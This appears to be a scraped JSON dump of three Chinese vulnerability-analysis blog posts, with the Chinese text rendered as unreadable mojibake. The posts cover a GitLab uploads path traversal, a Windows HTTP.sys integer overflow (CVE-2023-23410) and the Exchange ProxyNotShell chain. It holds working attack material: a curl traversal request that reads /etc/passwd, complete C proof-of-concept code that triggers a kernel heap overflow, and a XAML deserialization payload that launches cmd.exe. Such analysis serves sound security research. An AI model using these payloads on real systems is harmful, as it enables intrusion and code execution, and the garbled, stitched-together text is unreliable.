åœ¨config/routes/uploads.rbä¸­ï¼Œå®šä¹‰äº†è·¯ç”±åŒ¹é…è§„åˆ™ç”¨æ¥å¤„ç†ä¸Šä¼ æ–‡ä»¶å’Œæ˜¾ç¤ºæ–‡ä»¶çš„è¯·æ±‚ï¼Œç»“åˆspec\\requests\\uploads_controller_spec.rbçš„å†…å®¹å¯ä»¥çŸ¥é“åº”è¯¥æ˜¯åœ¨å¤„ç†è·¯ç”±get '-/system/:model/:id/:secret/:filename'æ—¶ï¼Œå°†æ–‡ä»¶åä¼ ç»™uploadsæ¨¡å—çš„showæ–¹æ³•è§¦å‘æ¼æ´ã€‚\nconfig/routes/uploads.rb # frozen_string_literal: true scope path: :uploads do # Note attachments and User/Group/Project/Topic avatars get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: %r{note|user|group|project|projects\\/topic|achievements\\/achievement}, mounted_as: /avatar|attachment/, filename: %r{[^/]+} } # show uploads for models, snippets (notes) available for now get \u0026#39;-/system/:model/:id/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/, filename: %r{[^/]+} } # show temporary uploads get \u0026#39;-/system/temp/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { filename: %r{[^/]+} } # Appearance get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /appearance/, mounted_as: /logo|header_logo|pwa_icon|favicon/, filename: /.+/ }, as: \u0026#39;appearance_upload\u0026#39; # create uploads for models, snippets (notes) available for now post \u0026#39;:model\u0026#39;, to: \u0026#39;uploads#create\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/ }, as: \u0026#39;upload\u0026#39; post \u0026#39;:model/authorize\u0026#39;, to: \u0026#39;uploads#authorize\u0026#39;, constraints: { model: /personal_snippet|user/ } # Alert Metric Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /alert_management_metric_image/, mounted_as: /file/, filename: %r{[^/]+} }, as: \u0026#39;alert_metric_image_upload\u0026#39; # Abuse Reports Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /abuse_report/, mounted_as: /screenshot/, filename: %r{[^/]+} }, as: \u0026#39;abuse_report_upload\u0026#39; end # Redirect old note attachments path to new uploads path. get \u0026#34;files/note/:id/:filename\u0026#34;, to: redirect(\u0026#34;uploads/note/attachment/%{id}/%{filename}\u0026#34;), constraints: { filename: %r{[^/]+} } å‘ç‚¹ ç»„å±‚æ•°ä¸å¤Ÿ\nåŸå…ˆæŒ‰ç…§å®˜æ–¹é€šå‘Šè¯´çš„è‡³å°‘5å±‚ç»„åµŒå¥—ï¼Œå°±åªæ–°å»ºäº†5å±‚ï¼Œè€Œåå‘é€payloadï¼Œä¸€ç›´æŠ¥400ï¼Œä¸€åº¦ä»¥ä¸ºç¯å¢ƒæ˜¯16.0.1ä¿®å¤ç‰ˆæœ¬ï¼Œè€Œåå‘ç°æ˜¯åµŒå¥—ä¸å¤Ÿã€‚\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/p1/uploads/dec19360ec8b52993908879181719de3/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%20 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;400 Bad Request\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; åæ¥å¾—åˆ°åŒäº‹æç¤ºï¼Œéœ€è¦è‡³å°‘9å±‚æ‰å¯ä»¥è®¿é—®åˆ°æ ¹ç›®å½•ã€‚\nç©¿è¶Šç¬¦ä¸å¤Ÿ\nç»æµ‹è¯•ï¼Œè‡³å°‘éœ€è¦12ä¸ªç©¿è¶Šç¬¦../ æ‰èƒ½æˆåŠŸç©¿è¶Šåˆ°æ ¹ç›®å½•\nå°ç»“\næœ¬æ¬¡æ¼æ´åˆ†ææœ‰ç‚¹äº‹åè¯¸è‘›äº®ï¼Œä»å·²çŸ¥çš„PoCæ¨æµ‹è§¦å‘çš„æ–‡ä»¶è·¯å¾„ï¼Œä½†æ€»ç®—æˆåŠŸç†è§£äº†æ•´ä¸ªè§¦å‘æ–‡ä»¶æµï¼Œå‘ç‚¹å°±æ˜¯nginxè§£æå¯¼è‡´éœ€è¦è¶³å¤Ÿçš„groupæ‰èƒ½ç©¿è¶Šåˆ°æ ¹ç›®å½•ï¼Œåˆ†æè¿™ä¸ªæ¼æ´çš„æ—¶å€™æ²¡å­¦è¿‡rubyï¼Œä¾é ChatGPTæ‰èƒ½å¤Ÿç†è§£æŸäº›ä»£ç ã€‚\nCreated at 2023-05-26T10:36:20+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/","title":"CVE-2023-23410 Windows HTTP.sys æƒé™æå‡æ¼æ´","tags":[],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åœ¨http.sysä¸­å­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ•´æ•°æº¢å‡ºæ¼æ´ç»•è¿‡å­—æ®µå¤§å°æ£€æŸ¥ï¼Œå¯¼è‡´åœ¨è°ƒç”¨memcpyæ—¶ä¼ å…¥è¶…å‡ºç¼“å†²åŒºå¤§å°çš„é•¿åº¦å‚æ•°ï¼Œé€ æˆå†…å­˜æº¢å‡ºã€‚\nç¯å¢ƒæ­å»º æ“ä½œç³»ç»Ÿ windows 10 è°ƒè¯•å™¨ windbg æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• PoC\n#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include \u0026lt;http.h\u0026gt; #include \u0026lt;sspi.h\u0026gt; #include \u0026lt;strsafe.h\u0026gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID; // åˆå§‹åŒ–HTTPæœåŠ¡å™¨é©±åŠ¨ retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpInitialize failed with %lu \\n\u0026#34;, retCode); return retCode; } // åˆ›å»ºæœåŠ¡ä¼šè¯ retCode = HttpCreateServerSession(HttpApiVersion, \u0026amp;ssID, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateServerSession failed with %lu \\n\u0026#34;, retCode); return 0; } // åˆ›å»ºurl group retCode = HttpCreateUrlGroup(ssID, \u0026amp;urlGroupId, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateUrlGroup failed with %lu \\n\u0026#34;, retCode); return 0; } BYTE data_temp1[0x1000] = {0}; DWORD return_len = 0; // åˆ†é… 0xfffffe0 å¤§å°çš„å †å— WCHAR *str = HeapAlloc(GetProcessHeap(), 0, 0xfffffe0); WCHAR str_test[0xfffe] = L\u0026#34;192.168.52.133:8081\u0026#34;; memcpy(str, str_test, 0x20); HTTP_CHANNEL_BIND_INFO bind_info; bind_info.Hardening = HttpAuthenticationHardeningLegacy; bind_info.Flags = HTTP_CHANNEL_BIND_PROXY; HTTP_SERVICE_BINDING_W service_binding; HTTP_SERVICE_BINDING_BASE binding_base; binding_base.Type = HttpServiceBindingTypeW; service_binding.Base = binding_base; service_binding.Buffer = str; service_binding.BufferSize = 0xfffffe0 - 0xf0f0f0; // F0F0EF0 PHTTP_SERVICE_BINDING_BASE binding_base_arr[0x11]; PHTTP_SERVICE_BINDING_BASE tmp_binding_base = \u0026amp;service_binding; for (int i = 0; i \u0026lt; 0x11; i++) { binding_base_arr[i] = tmp_binding_base; } bind_info.ServiceNames = binding_base_arr; bind_info.NumberOfServiceNames = 0x11; retCode = HttpSetUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;bind_info, 0x20); retCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); } åœ¨http!UlCopyChannelBindConfigToIrp ä¸‹æ–­ç‚¹ï¼Œè¿è¡ŒPoCï¼Œæ­¤æ—¶è°ƒç”¨æ ˆä¸º\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff889`cd7f76a8 fffff805`7981ae19 HTTP!UlCopyChannelBindConfigToIrp 01 fffff889`cd7f76b0 fffff805`7982caf5 HTTP!UlQueryConfigGroupProperty+0x175 02 fffff889`cd7f7740 fffff805`797130aa HTTP!UlQueryUrlGroupIoctl+0x195 03 fffff889`cd7f77c0 fffff805`6dc954d5 HTTP!UxDeviceControl+0x8a 04 fffff889`cd7f7800 fffff805`6e0a6048 nt!IofCallDriver+0x55 05 fffff889`cd7f7840 fffff805`6e0a5e47 nt!IopSynchronousServiceTail+0x1a8 06 fffff889`cd7f78e0 fffff805`6e0a51c6 nt!IopXxxControlFile+0xc67 07 fffff889`cd7f7a20 fffff805`6de0d8f5 nt!NtDeviceIoControlFile+0x56 08 fffff889`cd7f7a90 00007ff9`c610d1a4 nt!KiSystemServiceCopyEnd+0x25 09 00000014`7dcd6308 00007ff9`b6391b7a ntdll!NtDeviceIoControlFile+0x14 0a 00000014`7dcd6310 00007ff9`b6393c9f HTTPAPI!HttpApiSynchronousDeviceControl+0x8a 0b 00000014`7dcd6390 00007ff6`93fb18b2 HTTPAPI!HttpQueryUrlGroupProperty+0x6f 0c 00000014`7dcd6410 00000000`00000000 http_poc2!wmain+0x3d2 [D:\\code\\c\\http_poc2.c @ 113] http!UlCopyChannelBindConfigToIrp ä¼ªä»£ç å¦‚ä¸‹ï¼Œè¯¥å‡½æ•°è°ƒç”¨UxGetOutputBufferForOutDirect è®¡ç®—å­˜å‚¨ChannelBindConfig æ‰€éœ€çš„å†…å­˜å¤§å°ï¼Œå¹¶å’ŒUxGetOutputBufferForOutDirectè¿”å›çš„åˆ†é…çš„å†…å­˜å¤§å°ä½œæ¯”è¾ƒï¼š\n__int64 __fastcall UlCopyChannelBindConfigToIrp(__int64 a1, IRP *a2, unsigned int *a3) { ... v8 = UlpComputeChannelBindConfigSize(a1, a2); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 16, 4, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } v11 = v31; if ( (*(_DWORD *)a1 \u0026amp; 1) == 0 ) { *(_QWORD *)v31 = 0i64; *(_QWORD *)(v11 + 8) = 0i64; goto LABEL_32; } *(_DWORD *)(v31 + 4) = *(_DWORD *)(a1 + 8); *(_DWORD *)v11 = *(_DWORD *)(a1 + 4); *(_QWORD *)(v11 + 8) = 0i64; v12 = *(_QWORD *)(a1 + 16); if ( !v12 || !*(_DWORD *)(v12 + 16) ) goto LABEL_32; v13 = (v11 + 19) \u0026amp; 0xFFFFFFFFFFFFFFFCui64; v38 = v13; v36 = (_DWORD *)v13; *(_DWORD *)(v11 + 8) = v13 + v32 - v31; *(_DWORD *)(v11 + 12) = *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); v14 = *(unsigned int *)(*(_QWORD *)(a1 + 16) + 16i64); v15 = (_DWORD *)(v13 + 4 * v14); v37 = v15; v16 = (char *)\u0026amp;v15[3 * v14]; v35 = v16; v17 = 0; v34 = 0; while ( v17 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_DWORD *)(v13 + 4i64 * v17) = (_DWORD)v15 + v32 - v31; v18 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v17); if ( *(_DWORD *)v18 == 2 ) { v36 = v15 + 3; v37 = v15 + 3; *v15 = 2; v15[1] = (_DWORD)v16 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v16, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v35[*(unsigned int *)(v18 + 16)]; } else { v36 = v15 + 3; v37 = v15 + 3; *v15 = 1; v30 = (char *)((unsigned __int64)(v16 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); v15[1] = (_DWORD)v30 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v30, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v30[*(unsigned int *)(v18 + 16)]; } v35 = v16; v34 = ++v17; v15 = v36; v13 = v38; } LABEL_31: v3 = v42; goto LABEL_32; } v38 = 0i64; v19 = IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 24, v19 != 0 ? 4 : 8, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) == 0 ) goto LABEL_32; v10 = 44i64; goto LABEL_6; } if ( v21 \u0026amp;\u0026amp; *(_DWORD *)(v21 + 16) ) { ... while ( v26 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_QWORD *)(v22 + 8i64 * v26) = v32 + (unsigned int)(v24 - v31); v27 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v26); if ( *(_DWORD *)v27 == 2 ) { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 2; *(_QWORD *)(v24 + 8) = v32 + (unsigned int)((_DWORD)v25 - v31); *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v25, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16)); v25 = \u0026amp;v35[*(unsigned int *)(v27 + 16)]; } else { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 1; v28 = (char *)((unsigned __int64)(v25 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); *(_QWORD *)(v24 + 8) = v32 + (((_DWORD)v25 + 1) \u0026amp; 0xFFFFFFFE) - (unsigned int)v31; *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v28, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16));// è§¦å‘æ¼æ´ v25 = \u0026amp;v28[*(unsigned int *)(v27 + 16)]; } v35 = v25; v34 = ++v26; v24 = (__int64)v36; v22 = v39; } goto LABEL_31; } LABEL_32: if ( (int)(OutputBufferForOutDirect + 0x80000000) \u0026lt; 0 || OutputBufferForOutDirect == -2147483643 ) v6 = v8; *v3 = v6; return (unsigned int)OutputBufferForOutDirect; } åœ¨UlpComputeChannelBindConfigSizeå‡½æ•°ä¸­å­˜åœ¨æ•´æ•°æº¢å‡ºï¼Œè¯¥å‡½æ•°ä¼ªä»£ç å¦‚ä¸‹ï¼Œrsi+10hå¤„æŒ‡å‘äº†ç”¨æˆ·ä¼ å…¥çš„HTTP_CHANNEL_BIND_INFOç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š\ntypedef struct _HTTP_CHANNEL_BIND_INFO { HTTP_AUTHENTICATION_HARDENING_LEVELS Hardening; ULONG Flags; PHTTP_SERVICE_BINDING_BASE * ServiceNames; ULONG NumberOfServiceNames; } HTTP_CHANNEL_BIND_INFO, *PHTTP_CHANNEL_BIND_INFO; typedef enum _HTTP_AUTHENTICATION_HARDENING_LEVELS { HttpAuthenticationHardeningLegacy = 0, HttpAuthenticationHardeningMedium, HttpAuthenticationHardeningStrict } HTTP_AUTHENTICATION_HARDENING_LEVELS; typedef struct _HTTP_SERVICE_BINDING_BASE { HTTP_SERVICE_BINDING_TYPE Type; } HTTP_SERVICE_BINDING_BASE, *PHTTP_SERVICE_BINDING_BASE; typedef struct _HTTP_SERVICE_BINDING_A { HTTP_SERVICE_BINDING_BASE Base; PCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_A, *PHTTP_SERVICE_BINDING_A; typedef struct _HTTP_SERVICE_BINDING_W { HTTP_SERVICE_BINDING_BASE Base; PWCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_W, *PHTTP_SERVICE_BINDING_W; __int64 __fastcall UlpComputeChannelBindConfigSize(__int64 a1, IRP *a2) { unsigned int v4; // ebx __int64 v5; // rax __int64 v6; // rdi __int64 v7; // r9 _DWORD *v8; // r8 v4 = IoIs32bitProcess(a2) != 0 ? 16 : 24; if ( (*(_DWORD *)a1 \u0026amp; 1) != 0 ) { v5 = *(_QWORD *)(a1 + 16); if ( v5 ) { if ( *(_DWORD *)(v5 + 16) ) { v6 = 0i64; v4 += (IoIs32bitProcess(a2) != 0 ? 16 : 32) * *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); if ( *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { do { IoIs32bitProcess(a2); v7 = *(_QWORD *)(a1 + 16); // HTTP_CHANNEL_BIND_INFO ç»“æ„ä½“ v8 = *(_DWORD **)(*(_QWORD *)(v7 + 8) + 8 * v6);// ServiceName ç»“æ„ä½“ if ( *v8 == 1 ) // å¦‚æœæ˜¯HttpServiceBindingTypeW åˆ™è¿›å…¥ v4 = (v4 + 1) \u0026amp; 0xFFFFFFFE; v4 += v8[4]; // V8æ˜¯enum HTTP_SERVICE_BINDING_BASEç±»å‹ï¼Œå 4ä¸ªå­—èŠ‚ï¼Œåˆ™V8[4]å°±æ˜¯V8 åé¢16ä¸ªå­—èŠ‚ï¼Œå³BufferSize v6 = (unsigned int)(v6 + 1); } while ( (unsigned int)v6 \u0026lt; *(_DWORD *)(v7 + 16) ); } } } } return v4; } è¯¥å‡½æ•°éå†HTTP_CHANNEL_BIND_INFOç»“æ„ä½“çš„ServiceNames HTTP_SERVICE_BINDING_WæŒ‡é’ˆæ•°ç»„çš„BufferSizeï¼Œå¹¶ç›¸åŠ ï¼Œè€Œåå°†å…¶è¿”å›ï¼Œå…¶ä¸­v4ä¸ºunsigned intç±»å‹ï¼Œè€ŒBufferSizeä¸ºULONGç±»å‹ï¼Œå‡ä¸ºå››ä¸ªå­—èŠ‚ï¼Œå½“å¾ªç¯ç›¸åŠ æ—¶ï¼Œå¦‚æœBufferSize * NumberOfServiceNames å’Œv4ç›¸åŠ è¶…å‡º0xFFFFFFFFåˆ™ä¼šäº§ç”Ÿæ•´æ•°æº¢å‡ºï¼Œä½¿å¾—UlpComputeChannelBindConfigSizeè¿”å›çš„å†…å­˜å¤§å°å°äºå®é™…æ‰€éœ€çš„å†…å­˜å¤§å°ã€‚åœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°åœ¨æ‰§è¡Œå®Œfffff805`7984c899 03d9 add ebx, ecxåï¼Œå°†äº§ç”Ÿæº¢å‡ºï¼Œebxå˜ä¸º0x28ã€‚\nè¿”å›åˆ°ä¸Šå±‚å‡½æ•°ï¼ŒUlCopyChannelBindConfigToIrp è°ƒç”¨UxGetOutputBufferForOutDirectè·å–åˆ°ç”¨æˆ·ä¼ å…¥çš„ç¼“å†²åŒºå¤§å°ï¼Œæ­¤æ—¶v41å€¼ä¸º0x140\nretCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (__int64)a2, (__int64)CurrentStackLocation, 0x10u, 4i64, \u0026amp;v31, \u0026amp;v32, \u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } ç”±äºåœ¨HTTP!UlpComputeChannelBindConfigSizeä¸­å‘ç”Ÿæ•´æ•°æº¢å‡ºï¼Œå¯¼è‡´HTTP!UlpComputeChannelBindConfigSizeè¿”å›å€¼å°äºç”¨æˆ·æä¾›çš„0x140ï¼Œç»•è¿‡äº†å†…å­˜å¤§å°æ£€æŸ¥ï¼Œåœ¨åé¢é€šè¿‡memcpyå°†HTTP_CHANNEL_BIND_INFOç»“æ„ä½“çš„PHTTP_SERVICE_BINDING_BASEçš„Bufferæˆå‘˜æ‹·è´åˆ°æŒ‡å®šå†…å­˜ä¸­ï¼Œæ‹·è´é•¿åº¦ä¸ºBufferSizeï¼Œå³ç”¨æˆ·æä¾›çš„0xF0F0EF0\n0xF0F0EF0è¿œå¤§äºç”¨æˆ·è¾“å…¥çš„ç¼“å†²åŒº0x1000ï¼Œå¯¼è‡´å †æº¢å‡ºã€‚\nè¡¥ä¸ é€šè¿‡bindiffå¯çŸ¥ï¼Œåœ¨è¡¥ä¸ä¸­å¢åŠ äº†å¯¹BufferSizeè¿›è¡Œåˆ¤æ–­çš„é€»è¾‘ï¼Œåˆ¤æ–­BufferSizeæ˜¯å¦å°äº0xFFFC\nç”±äºServiceNameæœ€å¤§æ•°é‡é™åˆ¶ä¸º0x40ï¼Œåˆ™0x40 * 0xFFFC = 3FFF00ï¼Œä¸èƒ½äº§ç”Ÿæº¢å‡ºï¼Œä¿®å¤äº†è¯¥æ¼æ´ã€‚\nå‚è€ƒèµ„æ–™\nhttps://www.freebuf.com/vuls/364920.html\nCreated at 2023-05-05T20:59:45+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/","title":"Proxy Not Shell","tags":[],"description":"","content":"æ¼æ´ç¯å¢ƒ Windows Server 2019 Windows Exchange 2019 CU9 æ¼æ´åˆ†æ æ¼æ´é“¾åŒ…å«äº†ä¸¤ä¸ªæ¼æ´ï¼š\nCVE-2022-41040 Exchange æƒé™æå‡æ¼æ´ CVE-2022-41082 Exchange è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-41040 æ˜¯ProxyShellä¿®å¤ä¸å®Œå…¨çš„äº§ç‰©ï¼Œåœ¨ProxyShellåˆ©ç”¨é“¾ä¸­æ— éœ€èº«ä»½éªŒè¯å°±å¯ä»¥é€šè¿‡autodiscover.jsonè¯·æ±‚åˆ°/PowerShellæ¥å£ï¼Œåœ¨CVE-2022-41040 ä¸­ï¼Œä»…éœ€è¦ä½æƒé™èº«ä»½éªŒè¯å°±å¯ä»¥è¯·æ±‚åˆ°è¯¥æ¥å£ï¼Œé€šè¿‡SSRFå°†ä½æƒé™è½¬æ¢ä¸ºé«˜æƒé™ã€‚\nCVE-2022-41082æ˜¯Exchangeçš„ååºåˆ—åŒ–æ¼æ´ï¼Œé€šè¿‡ä¼ å…¥æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œä½¿å¾—Exchangeè§¦å‘èƒ½å¤Ÿé€ æˆä»£ç æ‰§è¡Œçš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œå°†æŒ‡å®šæ•°æ®ååºåˆ—åŒ–åˆ°æ¶æ„ç±»ï¼Œä»è€Œåœ¨ExchangeæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚\nåœ¨PoCä¸­å‘é€äº†ä»¥ä¸‹ä¸‰ç§ç±»å‹çš„PSRPæ¶ˆæ¯\n0x00010002 SESSION_CAPABILITY\nSESSION_CAPABILITY åº”è¯¥æ˜¯åˆ›å»ºRunspacePool\n0x00010004 INIT_RUNSPACEPOOL\nINIT_RUNSPACEPOOL åº”è¯¥æ˜¯åˆå§‹åŒ–RunspacePool\n0x00021006 CREATE_PIPELINE\nåˆ›å»ºå‘½ä»¤ç®¡é“å¹¶åœ¨æŒ‡å®šçš„ RunspacePool ä¸­è°ƒç”¨å®ƒ\nPoCé€šè¿‡PSRPåè®®åˆ›å»ºäº†è¿œç¨‹PowerShellç®¡é“ï¼Œå¹¶è¯•å›¾åœ¨è¿™ä¸ªç®¡é“å†…æ‰§è¡ŒNew-OfflineAddressBookè¿™ä¸ªcmdletï¼Œå¹¶å°†å¯¹åº”çš„åºåˆ—åŒ–æ•°æ®ä¼ ç»™äº†Exchangeã€‚\nPoCä¸»è¦ç»„æˆéƒ¨åˆ†å¦‚ä¸‹æ‰€ç¤ºï¼ŒBAæ ‡ç­¾å†…æ˜¯base64ç¼–ç çš„åºåˆ—åŒ–System.UnitySerializationHolderå¯¹è±¡\n\u0026lt;Obj N=\u0026#34;V\u0026#34; RefId=\u0026#34;14\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;Name\u0026#34;\u0026gt;Type\u0026lt;/S\u0026gt; \u0026lt;Obj N=\u0026#34;TargetTypeForDeserialization\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Exception\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;MS\u0026gt; \u0026lt;BA N=\u0026#34;SerializationData\u0026#34;\u0026gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=\u0026lt;/BA\u0026gt; \u0026lt;/MS\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;S\u0026gt; \u0026lt;![CDATA[\u0026lt;ResourceDictionary xmlns=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation\u0026#34; xmlns:x=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml\u0026#34; xmlns:System=\u0026#34;clr-namespace:System;assembly=mscorlib\u0026#34; xmlns:Diag=\u0026#34;clr-namespace:System.Diagnostics;assembly=system\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider x:Key=\u0026#34;LaunchCalch\u0026#34; ObjectType=\u0026#34;{x:Type Diag:Process}\u0026#34; MethodName=\u0026#34;Start\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider.MethodParameters\u0026gt;\u0026lt;System:String\u0026gt;cmd.exe\u0026lt;/System:String\u0026gt;\u0026lt;System:String\u0026gt;/c whoami\u0026gt; c:\\users\\public\\1.txt\u0026lt;/System:String\u0026gt; \u0026lt;/ObjectDataProvider.MethodParameters\u0026gt; \u0026lt;/ObjectDataProvider\u0026gt; \u0026lt;/ResourceDictionary\u0026gt;]]\u0026gt; \u0026lt;/S\u0026gt; \u0026lt;/Obj\u0026gt; XamlReader.Parse() BAæ ‡ç­¾æ•°æ® .....Ã¿Ã¿Ã¿Ã¿..............System.UnitySerializationHolder..... Data\tUnityType.AssemblyName......... System.Windows.Markup.XamlReader......... XPresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35. 